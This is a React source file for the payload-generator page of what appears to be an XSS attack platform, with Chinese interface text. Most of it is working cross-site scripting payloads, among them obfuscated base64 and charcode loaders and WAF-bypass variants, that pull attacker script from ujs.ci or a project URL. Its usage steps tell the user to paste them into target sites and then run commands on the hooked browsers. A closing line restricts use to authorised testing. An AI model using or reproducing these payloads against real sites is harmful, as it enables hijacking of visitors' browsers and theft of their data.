import React, { useState } from 'react';
import { Card, Button, Input, Badge } from './ui';
import ApiService from '../services/api';
import './PayloadGenerator.css';

const PayloadGenerator = ({ projectId }) => {
  const [customId, setCustomId] = useState('');
  const [copied, setCopied] = useState('');

  const payloadUrl = ApiService.getPayloadUrl(projectId);

  const generatePayloads = () => {
    const separator = payloadUrl.includes('?') ? '&' : '?';
    const baseUrl = customId 
      ? `${payloadUrl}${separator}id=${encodeURIComponent(customId)}`
      : payloadUrl;

    return {
      script: `<script src="${baseUrl}"></script>`,
      javascript: `document.write('<script src="${baseUrl}"><\\/script>');`,
      eval: `eval(fetch('${baseUrl}').then(r=>r.text()).then(eval));`,
      img: `<img src="x" onerror="var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);">`,
      svg: `<svg onload="var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);"></svg>`,
      iframe: `<iframe src="javascript:var s=document.createElement('script');s.src='${baseUrl}';document.head.appendChild(s);"></iframe>`
    };
  };

  const payloads = generatePayloads();

  const copyToClipboard = async (text, type) => {
    try {
      // 优先使用现代的 Clipboard API
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
      } else {
        // 降级方案：使用传统的 execCommand
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        
        if (!successful) {
          throw new Error('execCommand failed');
        }
      }
      
      setCopied(type);
      setTimeout(() => setCopied(''), 2000);
    } catch (error) {
      console.error('复制失败:', error);
      
      // 最后的降级方案：提示用户手动复制
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
      
      if (isMobile) {
        // 移动端：选中文本
        const range = document.createRange();
        const selection = window.getSelection();
        const textElement = document.getElementById(`payload-${type}`);
        if (textElement) {
          range.selectNodeContents(textElement);
          selection.removeAllRanges();
          selection.addRange(range);
        }
        alert('已选中文本，请手动复制（Ctrl+C 或 Cmd+C）');
      } else {
        // 桌面端：显示文本让用户手动复制
        prompt('复制失败，请手动复制以下内容:', text);
      }
    }
  };

  const payloadSections = [
    {
      title: '一、基础XSS载荷植入代码',
      description: '将如下代码植入怀疑出现xss的地方（注意\'的转义），即可在 项目内容 观看XSS效果。',
      payloads: [
        {
          key: 'basic_script',
          code: '<sCRiPt sRC=//ujs.ci/y18></sCrIpT>',
          description: '基础脚本注入'
        },
        {
          key: 'textarea_escape',
          code: '</tEXtArEa>\'"><sCRiPt sRC=//ujs.ci/y18></sCrIpT>',
          description: 'Textarea转义注入'
        },
        {
          key: 'input_focus',
          code: '\'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdWpzLmNpL3kxOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>',
          description: 'Input焦点触发'
        },
        {
          key: 'img_error',
          code: '\'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdWpzLmNpL3kxOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>',
          description: 'Image错误事件'
        },
        {
          key: 'complex_escape',
          code: '</tEXtArEa>\'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2Fujs.ci%2Fy18%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>',
          description: '复杂转义方式'
        },
        {
          key: 'simple_img',
          code: '<img src=x onerror=s=createElement(\'script\');body.appendChild(s);s.src=\'//ujs.ci/y18\';>',
          description: '简化Image注入'
        }
      ]
    },
    {
      title: '二、WAF绕过载荷',
      description: '下方XSS代码可绕过一般WAF防护 [注意如果直接把代码放入Burp，则需要把下方代码进行 URL编码]',
      payloads: [
        {
          key: 'swf_bypass',
          code: '<embed src=https://ujs.ci/liuyan/xs.swf?a=e&c=doc\\u0075ment.write(St\\u0072ing.from\\u0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,117,106,115,46,99,105,47,121,49,56,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash></embed>',
          description: 'SWF Flash绕过'
        },
        {
          key: 'char_code_bypass',
          code: '<img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,117,106,115,46,99,105,47,121,49,56,62,60,47,115,67,114,73,112,84,62))">',
          description: 'CharCode编码绕过',
          warning: '下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选"基础默认XSS"模块'
        }
      ]
    },
    {
      title: '三、极限绕过代码',
      description: '！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)',
      payloads: [
        {
          key: 'extreme_bypass',
          code: '<sCRiPt/SrC=//ujs.ci/y18>',
          description: '极限简化绕过'
        }
      ]
    },
    {
      title: '四、图片探测系统',
      description: '只要对方网站可以调用外部图片(或可自定义HTML)，请填入下方图片地址(代码)，则探测对方数据',
      payloads: [
        {
          key: 'img_detect_1',
          code: 'https://ujs.ci/y18.jpg',
          description: '图片插件一【若使用此探测，必须勾选\'默认模块\'！！！】'
        },
        {
          key: 'img_detect_2',
          code: '<Img srC=http://ujs.ci/y18.jpg>',
          description: 'HTML图片标签'
        },
        {
          key: 'img_detect_3',
          code: '<Img srC="https://ujs.ci/y18.jpg">',
          description: 'HTTPS图片标签'
        },
        {
          key: 'img_detect_4',
          code: '<Img sRC=//ujs.ci/y18.jpg>',
          description: '协议自适应图片标签'
        }
      ],
      note: '注意：图片xss不能获取cookie（只记录referer、IP、浏览器等信息，常用于探测后台地址）'
    }
  ];

  return (
    <Card title="载荷生成器" className="payload-generator">
      <div className="payload-generator__config">
        <Input
          label="自定义客户端ID（可选）"
          value={customId}
          onChange={(e) => setCustomId(e.target.value)}
          placeholder="留空将自动生成唯一ID"
        />
        
        <div className="payload-generator__server-info">
          <div className="payload-generator__server-label">载荷服务器:</div>
          <div className="payload-generator__server-url">{payloadUrl}</div>
        </div>
      </div>

      <div className="payload-generator__sections">
        {payloadSections.map((section) => (
          <div key={section.title} className="payload-section">
            <div className="payload-section__header">
              <h3 className="payload-section__title">{section.title}</h3>
              <p className="payload-section__description">{section.description}</p>
            </div>
            
            <div className="payload-section__payloads">
              {section.payloads.map((payload) => (
                <div key={payload.key} className="payload-item">
                  <div className="payload-item__header">
                    <div className="payload-item__info">
                      <span className="payload-item__description">{payload.description}</span>
                      {payload.warning && (
                        <div className="payload-item__warning">
                          ⚠️ {payload.warning}
                        </div>
                      )}
                    </div>
                    <Button
                      variant="secondary"
                      size="sm"
                      onClick={() => copyToClipboard(payload.code, payload.key)}
                      className="payload-item__copy-btn"
                    >
                      {copied === payload.key ? '已复制!' : '复制'}
                    </Button>
                  </div>
                  
                  <div className="payload-item__code">
                    <pre className="payload-item__code-content" id={`payload-${payload.key}`}>
                      {payload.code}
                    </pre>
                  </div>
                </div>
              ))}
            </div>
            
            {section.note && (
              <div className="payload-section__note">
                📝 {section.note}
              </div>
            )}
          </div>
        ))}
      </div>

      <div className="payload-generator__usage">
        <h4 className="payload-generator__usage-title">使用说明</h4>
        <div className="payload-generator__usage-content">
          <ol className="payload-generator__usage-list">
            <li>选择合适的载荷类型复制到剪贴板</li>
            <li>在目标网站的输入框中粘贴载荷</li>
            <li>触发XSS执行（提交表单、刷新页面等）</li>
            <li>返回控制台查看连接的客户端</li>
            <li>对连接的客户端执行各种命令</li>
          </ol>
          
          <div className="payload-generator__warning">
            <strong>⚠️ 安全警告:</strong>
            <p>此工具仅用于授权安全测试。请确保您有权限测试目标系统，并遵守相关法律法规。</p>
          </div>
        </div>
      </div>
    </Card>
  );
};

export default PayloadGenerator;